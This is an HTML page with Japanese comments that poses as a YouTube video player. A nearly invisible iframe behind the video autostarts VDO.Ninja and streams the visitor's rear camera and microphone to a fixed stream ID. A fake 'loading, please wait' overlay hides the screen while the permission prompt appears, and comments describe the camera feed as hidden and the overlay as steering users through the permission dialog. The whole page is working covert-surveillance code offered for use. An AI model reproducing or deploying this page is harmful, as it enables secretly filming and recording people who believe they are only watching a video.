<!doctype html>
<html lang="ja">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <meta name="robots" content="noindex,nofollow" />

  <!-- タブ名 / 履歴表示名 -->
  <title>動画再生ページ</title>

  <!-- iPhoneで「ホーム画面に追加」した時の表示名 -->
  <meta name="apple-mobile-web-app-title" content="撮影ページ">
  <meta name="application-name" content="撮影ページ">

  <style>
    html, body { height: 100%; margin: 0; background:#000; }

    /* 裏：VDO.Ninja（配信用・見えない） */
    iframe#vdo {
      position: fixed; inset: 0;
      width: 100%; height: 100%;
      border: 0;
      opacity: 0.001;
      pointer-events: none;
    }

    /* 表：YouTube */
    .overlay {
      position: fixed; inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #000;
    }

    /* 横画面っぽい表示枠 */
    .video-wrap {
      width: 90vw;
      max-width: 960px;
      aspect-ratio: 16 / 9;
      background: #000;
    }
    .video-wrap iframe {
      width: 100%;
      height: 100%;
      border: 0;
    }

    /* 初動ガード（許可ダイアログ誘導） */
    .guard {
      position: fixed; inset: 0;
      display:flex;
      align-items:center;
      justify-content:center;
      text-align:center;
      padding:24px;
      background:#000;
      color:#fff;
      z-index: 3;
      font-family: system-ui, -apple-system, "Hiragino Sans", "Noto Sans JP", sans-serif;
      line-height:1.8;
      font-size:18px;
      letter-spacing:.02em;
      user-select:none;
      -webkit-user-select:none;
    }
    .guard .note{
      margin-top:12px;
      font-size:13px;
      opacity:.7;
      line-height:1.7;
    }
  </style>
</head>

<body>
  <!-- 裏：カメラ配信 -->
  <iframe
    id="vdo"
    allow="camera *; microphone *; autoplay; fullscreen"
    referrerpolicy="no-referrer"
  ></iframe>

  <!-- 表：YouTube（URLは絶対に1行で） -->
  <div class="overlay">
    <div class="video-wrap">
      <iframe
        id="yt"
        src="https://www.youtube.com/embed/Vo-771wlTko?autoplay=1&mute=1&playsinline=1&controls=1&rel=0"
        title="YouTube video player"
        allow="autoplay; encrypted-media; picture-in-picture"
        referrerpolicy="strict-origin-when-cross-origin"
        allowfullscreen
      ></iframe>
    </div>
  </div>

  <!-- 最初だけ表示 -->
  <div class="guard" id="guard">
    <div>
      読み込み中…<br>
      このままの画面でお待ちください。
      <div class="note">※スマホをスリープ状態にしないでください。</div>
    </div>
  </div>

  <script>
    const STREAM_ID = "toaCam01";

    // VDO.Ninja：送信（外カメラ優先）
    const vdoSrc =
      "https://vdo.ninja/?" +
      "push=" + encodeURIComponent(STREAM_ID) +
      "&webcam" +
      "&autostart" +
      "&facing=rear" +
      "&cleanoutput" +
      "&hidehome" +
      "&transparent";

    document.getElementById("vdo").src = vdoSrc;

    setTimeout(() => {
      const g = document.getElementById("guard");
      if (g) g.style.display = "none";
    }, 2500);
  </script>
</body>
</html>
